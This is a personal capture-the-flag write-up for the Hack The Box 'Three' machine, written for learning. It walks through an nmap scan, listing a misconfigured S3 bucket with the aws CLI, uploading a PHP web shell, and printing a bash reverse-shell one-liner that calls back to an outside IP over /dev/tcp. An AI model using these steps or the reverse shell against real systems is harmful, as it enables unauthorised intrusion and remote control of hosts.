# Three (Very Easy)
- **IP Address:** '10.129.92.179'
- **OS:** Linux
- **Difficulty:** Very Easy
- **HTB Link:** [Machine Page](https://app.hackthebox.com/machines/three)

---

## Enumeration 

### Nmap Scan

```
nmap -sC -sV -T5 -p- -vv 10.129.92.179
```

### Open Ports & Services
#### Syntax: Port ; Service ; Version

22 ; ssh ; OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80 ; http ; Apache httpd 2.4.29 ((Ubuntu))

There is a band website on port 80

fuzzing efforts bore no fruit, even when copying writeup command, so through divine intervention I now know there is a subdomain that is s3.thetoppers.htb

In the source code, there is proof that the server runs on PHP

s3 references an Amazon s3 bucket, so I installed awscli, and then ran ```aws configure``` with temp values for everything

Then, I listed all the s3 buckets using ```aws --endpoint=http://s3.thetoppers.htb s3 ls```, then listed the objects under the thetoppers.htb bucket that was returned with ```aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb```

Since there is an index.php, .htaccess, and /images within, we can deduce that the Apache server is using this S3 bucket as storage

---

## Exploitation
### Vulnerabiliy Exploited 

Since I am able to cp a file into the thetoppers.htb bucket, I made a simple php web shell and uploaded it, which gave me a web shell

---

## Privilege Escalation
### Root Exploitation

I then made a reverse shell ```bash -i >& /dev/tcp/10.10.15.12/1337 0>&1``` and started a netcat listener on 1337, then served the file to the server by hosting a python http server, and curling it with the web shell. Once I had a rev shell, I searched for the flag, which was in /var/www

---

### [Flags](https://github.com/TianKwock/htb-flags/blob/main/README.md#three)

---

## Lessons Learned

If there is a website, look through the source code for clues

Do research on the systems that you are trying to attack, the aws s3 commands were crucial in this hack

Use web shells to upgrade to a bash reverse shell, using a python http server to serve the file while listening with a nc listener is one way

---

Perceived Difficulty: Not So Easy 

Time Taken: 1 hr 15 min 

Date PWNED: 4/7/2026 
